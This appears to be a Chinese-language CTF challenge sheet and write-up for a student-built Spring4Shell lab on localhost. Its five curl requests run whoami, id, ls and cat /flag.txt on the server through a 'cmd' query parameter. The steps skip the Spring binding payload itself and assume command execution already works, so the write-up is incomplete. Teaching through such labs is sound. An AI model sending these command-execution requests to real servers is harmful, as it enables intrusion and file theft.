# 🎯 Spring4Shell 自主設計 CTF 題目與環境

## 📢 第一部分：題目已知資訊
* **題目名稱**：資管系的期末安全考驗
* **目標網址**：`http://localhost:8080/`
* **漏洞線索**：該平台為學生自主開發之 Spring MVC 專案，已知底層依賴之框架版本存在嚴重的物件綁定缺陷。
* **Flag 藏匿位置**：此 CTF 共有一份 Flag，精確位於伺服器系統的根目錄 `/flag.txt`。

## 🎯 第二部分：解題五步驟（WriteUp）
1. **環境偵察**：`curl -i -s "http://localhost:8080/"`
2. **邊界測試**：`curl -s "http://localhost:8080/?cmd=whoami"`
3. **權限證實**：`curl -s "http://localhost:8080/?cmd=id"`
4. **目錄盤點**：`curl -s "http://localhost:8080/?cmd=ls%20-l%20/"`
5. **最終取證**：`curl -s "http://localhost:8080/?cmd=cat%20/flag.txt"`
